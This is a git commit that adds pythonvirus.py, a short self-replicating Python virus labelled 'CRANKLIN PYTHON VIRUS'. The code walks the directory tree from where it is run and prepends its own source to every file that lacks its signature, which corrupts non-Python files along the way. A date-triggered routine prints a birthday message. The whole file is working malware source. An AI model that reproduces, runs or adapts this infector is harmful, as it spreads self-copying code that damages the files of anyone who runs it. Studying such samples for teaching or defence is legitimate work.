08c864f02f3d530428d89f3ef18e9571712c8103
Eddie Kim <eekim125@yahoo.com>
2012-04-07 18:47:33 -0700

    first commit

---
+++ pythonvirus.py
@@ -0,0 +1,39 @@
+#!/usr/bin/python
+import os
+import datetime
+SIGNATURE = "CRANKLIN PYTHON VIRUS"
+def search(path):
+    filestoinfect = []
+    filelist = os.listdir(path)
+    for fname in filelist:
+        if os.path.isdir(path+"/"+fname):
+            filestoinfect.extend(search(path+"/"+fname))
+        else:
+            infected = False
+            for line in open(path+"/"+fname):
+                if SIGNATURE in line:
+                    infected = True
+                    break
+            if infected == False:
+                filestoinfect.append(path+"/"+fname)
+    return filestoinfect
+def infect(filestoinfect):
+    virus = open(os.path.abspath(__file__))
+    virusstring = ""
+    for i,line in enumerate(virus):
+        if i>=0 and i <39:
+            virusstring += line
+    virus.close
+    for fname in filestoinfect:
+        f = open(fname)
+        temp = f.read()
+        f.close()
+        f = open(fname,"w")
+        f.write(virusstring + temp)
+        f.close()
+def bomb():
+    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
+        print "HAPPY BIRTHDAY CRANKLIN!"
+filestoinfect = search(os.path.abspath(""))
+infect(filestoinfect)
+bomb()
